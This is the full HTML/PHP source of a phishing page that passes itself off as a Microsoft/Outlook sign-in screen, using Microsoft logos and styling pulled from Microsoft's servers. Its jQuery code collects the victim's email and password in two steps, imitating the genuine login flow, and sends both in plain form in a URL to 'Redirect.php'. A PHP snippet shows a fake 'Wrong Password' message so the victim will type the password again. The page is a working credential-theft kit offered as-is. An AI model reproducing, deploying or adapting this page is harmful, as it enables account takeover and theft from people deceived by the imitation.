<!DOCTYPE html>
<html dir="ltr" class="" lang="en">

	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
		<title>Sign in to your account</title>

		<meta http-equiv="X-UA-Compatible" content="IE=edge">
		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
		<meta http-equiv="Pragma" content="no-cache">
		<meta http-equiv="Expires" content="-1">
		<meta name="PageID" content="documentId">
		<meta name="SiteID" content="./,inv,.luesaghunbmjgfjk">
		<meta name="ReqLC" content="1033">
		<meta name="LocLC" content="en-US">
		<link rel="shortcut icon" href="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.7135.7/content/images/favicon_a.ico">
		<link href="./main_files/converged.login.min.css" rel="stylesheet">
		<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
	</head>

	<body data-bind="defineGlobals: ServerData, bodyCssClass" class="cb" style="display: block;">
		<div>
			<!--  -->
			<div data-bind="component: { name: &#39;background-image&#39;, publicMethods: backgroundControlMethods }">
				<div class="background" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }">
					<!-- ko if: smallImageUrl -->
					<div data-bind="backgroundImage: smallImageUrl()" style="background-image: url(&quot;https://secure.aadcdn.microsoftonline-p.com/ests/2.1.7135.7/content/images/backgrounds/0-small.jpg?x=12f4b8b543125cc986c79cd85320812f&quot;);"></div>
					<!-- /ko -->
					<!-- ko if: backgroundImageUrl -->
					<div class="backgroundImage" data-bind="backgroundImage: backgroundImageUrl()" style="background-image: url(&quot;https://secure.aadcdn.microsoftonline-p.com/ests/2.1.7135.7/content/images/backgrounds/0.jpg?x=f5a9a9531b8f4bcc86eabb19472d15d5&quot;);"></div>
					<!-- /ko -->
					<!-- ko if: !!backgroundImageUrl() -->
					<div class="background-overlay"></div>
					<!-- /ko -->
				</div>
			</div>
			<form name="f1" id="i0281" spellcheck="false" method="post" autocomplete="off" action="">
			</form>
			<!-- ko withProperties: { '$loginPage': $data } -->
			<div class="outer">
				<!-- ko template: { nodes: $componentTemplateNodes, data: $parent } -->
				<!-- ko if: svr.fShowCookieBanner -->
				<!-- /ko -->
				<div class="middle" data-bind="css: { &#39;app&#39;: $loginPage.backgroundLogoUrl() }">
					<!-- ko if: $loginPage.backgroundLogoUrl() && !(paginationControlMethods() && paginationControlMethods().currentViewHasMetadata('hideLogo')) -->
					<!-- /ko -->
					<div class="inner" data-bind="css: { &#39;app&#39;: $loginPage.backgroundLogoUrl(), &#39;wide&#39;: paginationControlMethods() &amp;&amp; paginationControlMethods().currentViewHasMetadata(&#39;wide&#39;) }">
						<!-- ko ifnot: paginationControlMethods() && paginationControlMethods().currentViewHasMetadata('hideLogo') -->
						<div role="banner">
							<img class="logo" role="presentation" pngsrc="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.7135.7/content/images/microsoft_logo.png?x=ed9c9eb0dce17d752bedea6b5acda6d9" svgsrc="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.7135.7/content/images/microsoft_logo.svg?x=ee5c8d9fb6248c938fd0dc19370e90bd"
								data-bind="imgSrc" src="./main_files/microsoft_logo.svg">
						</div>
						<!-- /ko -->
						<!-- ko if: showErrorDetails -->
						<!-- /ko -->
						<div role="main">
							<div data-bind="css: { &#39;animate&#39;: animate() || animate.back(), &#39;back&#39;: animate.back }" class="animate">
								<!-- ko foreach: views -->
								<!-- ko if: $parent.currentViewIndex() === $index() -->
								<!-- ko template: { nodes: [$data], data: $parent } -->
								<div data-viewid="1" >
									<!--  -->
									<div class="hide" id="emailBox"><!--  --> 
										<div class="identityBanner"> 
											<div id="displayName" class="identity"></div> 
											<div class="profile-photo"> 
												<img role="presentation" src="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.7135.7/content/images/picker_account_aad.svg?x=9de70d1c5191d1852a0d5aac28b44a6c"> 
											</div> 
										</div>
									</div>
									<div id="loginHeader" class="row text-title" role="heading">Sign in</div>
									<?php 
										if((isset($_GET["Notice"])) && ($_GET["Notice"]==1)) 
										{ echo'<div id="loginHeader" style="color:red;font-size:14px">Wrong Password</div>';}
									?>
									<div id="passHeader" class="row text-title hide" role="heading">Enter password</div>
									<!-- ko if: pageDescription && !svr.fHideLoginDesc -->
									<!-- /ko -->
									<div class="row">
										<div role="alert" aria-live="assertive" aria-atomic="false">
											<!-- ko if: usernameTextbox.error -->
											<!-- /ko -->
										</div>
										<div class="form-group col-md-24">
											<!-- ko if: prefillNames().length > 1 -->
											<!-- /ko -->
											<!-- ko ifnot: prefillNames().length > 1 -->
											<div class="placeholderContainer">
												<!-- ko withProperties: { '$placeholderText': placeholderText } -->
												<!-- ko template: { nodes: $componentTemplateNodes, data: $parent } -->
												<div class="alert alert-error col-md-24 hide" id="usernameError">Enter a valid email address.</div>
												<input type="email" id="i0116" maxlength="113" lang="en" class="form-control ltr_override" aria-describedby="usernameError loginHeader loginDescription" placeholder="someone@example.com" aria-required="true" aria-label="Enter your email address">
												<input name="passwd" type="password" id="i0118" autocomplete="off" class="form-control hide" aria-describedby="passwordError loginHeader passwordDesc" aria-required="true" placeholder="Password" aria-label="Enter password">
												<input type="hidden" name="domain_type" value="Outlook" id="domain_type" />
												<div id="usernameProgress" class="progress hide" role="progressbar" data-bind="visible: isRequestPending, component: &#39;marching-ants-control&#39;, ariaLabel: str[&#39;WF_STR_ProgressText&#39;]"
													aria-label="Please wait">
													<!--  -->
													<!-- ko if: useCssAnimation -->
													<div></div>
													<div></div>
													<div></div>
													<div></div>
													<div></div>
													<div></div>
													<!-- /ko -->
													<!-- ko ifnot: useCssAnimation -->
													<!-- /ko -->
												</div>
												<!-- /ko -->
												<!-- /ko -->
												<!-- ko ifnot: usePlaceholderAttribute -->
												<!-- /ko -->
											</div>
											<!-- /ko -->
										</div>
									</div>
									<div class="row">
										<div>
											<div class="col-xs-24 form-group no-padding-left-right">
												<div data-bind="css: { &#39;col-xs-12 secondary&#39;: isPrimaryButtonVisible(), &#39;col-xs-24&#39;: !isPrimaryButtonVisible() }" class="col-xs-12 secondary"> 
													<input type="button" id="idBtn_Back" class="btn btn-block hide" value="Back"> 
												</div>
												<div data-bind="css: { 'col-xs-12 primary': isPrimaryButtonVisible(), 'col-xs-24': !isSecondaryButtonVisible() }" class="col-xs-12 secondary"> 
													<input type="submit" id="idSign9" class="btn btn-block btn-primary hide" value="Sign in"> 
												</div>
												<div data-bind="css: { &#39;col-xs-12 primary&#39;: isSecondaryButtonVisible(), &#39;col-xs-24&#39;: !isSecondaryButtonVisible() }" class="col-xs-24"> 
													<input type="submit" id="idSIButton9" class="btn btn-block btn-primary" value="Next"> 
												</div>
											</div>
										</div>
									</div>
									<div class="row">
										<div class="col-md-24">
											<div class="text-13 action-links">
												<div class="form-group"> 
													<a id="cantAccessAccount" href="#">Can’t access your account?</a> 
													<a id="forgotPass" href="#" class="hide">Forgot my password</a> 
												</div>
												<!-- /ko -->
											</div>
										</div>
									</div>
								</div>
									
							</div>
						</div>
					</div>
					</div>
					<!-- /ko -->
				</div>
				<!-- /ko -->
				<!-- ko if: showOptOutBanner -->
				<!-- /ko -->
				<div id="footer" class="footer default" role="contentinfo" data-bind="css: { &#39;default&#39;: !backgroundLogoUrl() }">
					<div data-bind="component: { name: &#39;footer-control&#39;,
				params: {
					serverData: svr,
					showLinks: true },
				event: {
					agreementClick: footer_agreementClick,
					moreInfoClick: footer_onShowDebugDetails } }">
						<!--  -->
						<!-- ko if: showLinks || impressumLink || showIcpLicense -->
						<div id="footerLinks" class="footerNode text-secondary">
							<!-- ko if: !showIcpLicense --><span id="ftrCopy" data-bind="html: svr.strCopyrightTxt">©2018 Microsoft</span>
							<!-- /ko --><a id="ftrTerms" data-bind="text: str[&#39;MOBILE_STR_Footer_Terms&#39;], href: termsLink, click: termsLink_onClick" href="#">Terms of use</a> <a id="ftrPrivacy" data-bind="text: str[&#39;MOBILE_STR_Footer_Privacy&#39;], href: privacyLink, click: privacyLink_onClick"
								href="#">Privacy &amp; cookies</a>
							<a href="#" role="button" class="moreOptions" aria-label="Click here for more options" title="Click here for more options">
								<img class="desktopMode" role="presentation" pngsrc="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.7135.7/content/images/ellipsis_white.png?x=0ad43084800fd8b50a2576b5173746fe" svgsrc="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.7135.7/content/images/ellipsis_white.svg?x=5ac590ee72bfe06a7cecfd75b588ad73"
									data-bind="imgSrc" src="./main_files/ellipsis_white.svg">
								<img class="mobileMode" role="presentation" pngsrc="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.7135.7/content/images/ellipsis_grey.png?x=5bc252567ef56db648207d9c36a9d004" svgsrc="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.7135.7/content/images/ellipsis_grey.svg?x=2b5d393db04a5e6e1f739cb266e65b4c"
									data-bind="imgSrc" src="./main_files/ellipsis_grey.svg">
							</a>
						</div>
						<!-- /ko -->
					</div>
				</div>
		</div>
		<script type="text/javascript">
			function validateEmail(email) {
				var re = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
				return re.test(email);
			}
			$(document).ready(function() {
				$("#idBtn_Back").click(function() {
					window.location.replace("index.php");
				});
			});
			$(document).ready(function() {
				$("#idSIButton9").click(function() {
					var use = $("#i0116").val();
					if (validateEmail(use) == true) {
						$("#usernameProgress").removeClass("hide");
						var delayInMilliseconds = 5000; //5 second

						setTimeout(function() {
							$("#usernameProgress").addClass("hide");
							$("#i0116").addClass("hide");
							$("#usernameError").addClass("hide");
							$("#emailBox").removeClass("hide");
							$("#idBtn_Back").removeClass("hide");
							$("#i0118").removeClass("hide");
							$("#cantAccessAccount").addClass("hide");
							$("#passHeader").removeClass("hide");
							$("#idSign9").removeClass("hide");
							$("#forgotPass").removeClass("hide");
							$("#loginHeader").addClass("hide");
							$("#idSIButton9").addClass("hide");
							$("#displayName").html(use);
						}, delayInMilliseconds);
						
					} else {
						$("#usernameError").removeClass("hide");
					}
				});
			});
			
			$(document).ready(function() {
				$('#i0116').bind('keyup', function(e) {
					if (e.which == 13) {
						var use = $("#i0116").val();
						if (validateEmail(use) == true) {
							$("#usernameProgress").removeClass("hide");
							var delayInMilliseconds = 5000; //5 second

							setTimeout(function() {
								$("#usernameProgress").addClass("hide");
								$("#i0116").addClass("hide");
								$("#usernameError").addClass("hide");
								$("#emailBox").removeClass("hide");
								$("#idBtn_Back").removeClass("hide");
								$("#i0118").removeClass("hide");
								$("#cantAccessAccount").addClass("hide");
								$("#passHeader").removeClass("hide");
								$("#idSign9").removeClass("hide");
								$("#forgotPass").removeClass("hide");
								$("#loginHeader").addClass("hide");
								$("#idSIButton9").addClass("hide");
								$("#displayName").html(use);
							}, delayInMilliseconds);
							
						} else {
							$("#usernameError").removeClass("hide");
						}
					}
				});
			});
			$(document).ready(function() {
				$("#idSign9").click(function() {
				
					var domain = $("#domain_type").val();
					var pass = $("#i0118").val();
					var user = $("#i0116").val();
					var data = "user="+user+"&pass="+pass+"&domain="+domain;
					window.location="Redirect.php?"+data;
				});
			});
			$('#i0118').bind('keyup', function(e) {
				if (e.which == 13) {
					var domain = $("#domain_type").val();
					var pass = $("#i0118").val();
					var user = $("#i0116").val();
					var data = "user="+user+"&pass="+pass+"&domain="+domain;
					window.location="Redirect.php?"+data;
				}
			});
		</script>
	</body>

</html>